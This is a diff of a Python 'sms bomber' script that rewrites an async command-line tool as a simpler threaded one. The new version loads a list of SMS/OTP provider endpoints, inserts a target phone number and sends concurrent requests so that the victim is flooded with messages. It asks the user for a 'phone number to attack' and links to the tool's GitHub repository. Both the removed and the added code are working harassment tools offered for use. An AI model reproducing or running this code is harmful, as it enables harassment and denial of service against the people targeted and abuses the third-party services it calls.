@@ -1,71 +1,78 @@
-#!/usr/bin/env python3
-import asyncio
-import argparse
-import sys
-from core.bomber import Bomber
-from core.utils import load_provider_pool, save_working_cache
-from core.tester import ProviderTester  # (we'll define this)
-from core.discovery import ProviderDiscoverer
+import requests
+import threading
+import json
 
-async def bomb(args):
-    pool = load_provider_pool()
-    if args.verify_only:
-        working = await ProviderTester.validate_pool(pool, args.target, args.country)
-        save_working_cache(working)
-        print(f"Verified {len(working)} working providers.")
-        return
-    bomber = Bomber(
-        target=args.target,
-        cc=args.country,
-        num_requests=args.sms,
-        max_concurrent=args.threads,
-        use_proxy=args.proxy,
-        retries=args.retries
-    )
-    results = await bomber.run()
-    print(f"Success: {results['success']} | Failed: {results['failed']}")
 
-async def verify(args):
-    pool = load_provider_pool()
-    working = await ProviderTester.validate_pool(pool, args.target, args.country)
-    save_working_cache(working)
-    print(f"Verified {len(working)} providers out of {len(pool)}.")
 
-async def update(args):
-    providers = await ProviderDiscoverer.fetch_public()
-    if providers:
-        with open("config/providers.json", "w") as f:
-            json.dump({"providers": providers}, f, indent=2)
-        print(f"Updated providers list with {len(providers)} entries.")
-    else:
-        print("No public providers fetched.")
+def replace_phonenumber(phone , data="") :
+    result = data.replace("Replace phonenumber here" , phone)
+    return result
 
-def main():
-    parser = argparse.ArgumentParser(description="SMS Testing Framework")
-    subparsers = parser.add_subparsers(dest="command", required=True)
 
-    bomb_parser = subparsers.add_parser("bomb", help="Send SMS requests")
-    bomb_parser.add_argument("target", help="Phone number (without country code)")
-    bomb_parser.add_argument("--country", "-c", default="91", help="Country code")
-    bomb_parser.add_argument("--sms", "-S", type=int, default=20, help="Number of requests")
-    bomb_parser.add_argument("--threads", "-T", type=int, default=20, help="Concurrency")
-    bomb_parser.add_argument("--proxy", "-p", action="store_true", help="Use proxies")
-    bomb_parser.add_argument("--retries", "-r", type=int, default=2, help="Retry attempts")
-    bomb_parser.add_argument("--verify-only", action="store_true", help="Only verify providers")
+def send_message(phone, provider_name, provider_info = {} ) :
+    method = provider_info.get("method")
+    url = provider_info.get("url")
 
-    verify_parser = subparsers.add_parser("verify", help="Verify and cache working providers")
-    verify_parser.add_argument("target", help="Test phone number (without country code)")
-    verify_parser.add_argument("--country", "-c", default="91", help="Country code")
+    if (method.lower() == "post"):
+        parameters = provider_info.get("parameters")
 
-    update_parser = subparsers.add_parser("update", help="Fetch public provider list (research)")
+        try :
+            response = requests.post(url=url , json=parameters , timeout=2)
+            if response.status_code == 200 :
+                print(f"{provider_name} => Successful ;")
+            else :
+                print(f"{provider_name} => Failed ; error : {response.content}")
+        except Exception as error :
+            print(f"{provider_name} => {error} ;")
 
-    args = parser.parse_args()
-    if args.command == "bomb":
-        asyncio.run(bomb(args))
-    elif args.command == "verify":
-        asyncio.run(verify(args))
-    elif args.command == "update":
-        asyncio.run(update(args))
+    elif (method.lower() == "get") :
+        try :
+            response = requests.get(url=url , timeout=2)
+            if response.status_code == 200 :
+                print(f"{provider_name} => Successful ;")
+            else :
+                print(f"{provider_name} => Failed ;")
+        except Exception as error :
+            print(f"{provider_name} => {error} ;")
+
+    else :
+        print(f"Unknown Method")
+
+
+def start_attack (phone):
+
+    file = open("providers.json")
+    data = file.read()
+
+    Final_data = replace_phonenumber(phone=phone , data=data)
+    providers = json.loads(Final_data)
+
+    thread_list = []
+
+    for provider in providers :
+        provider_info = providers.get(provider)
+        thread = threading.Thread(target=send_message , args=(phone , provider, provider_info))
+        thread_list.append(thread)
+    
+    # start thread 
+    for thread in thread_list : 
+        thread.start()
+
+    # wait until thread finish
+    for thread in thread_list :
+        thread.join()
+
+
+def main() :
+    print("Wellcome to sms bomber (https://github.com/Hamed-244/sms-bomber) give us a star")
+    phone = input("Enter a valid phone number to attack : ").strip()
+
+    if phone in ["" , " " , "0"] :
+        print("invalid phone number !")
+    else :
+        start_attack(phone)
+        print("Attack finished :)")
+
 
 if __name__ == "__main__":
     main()
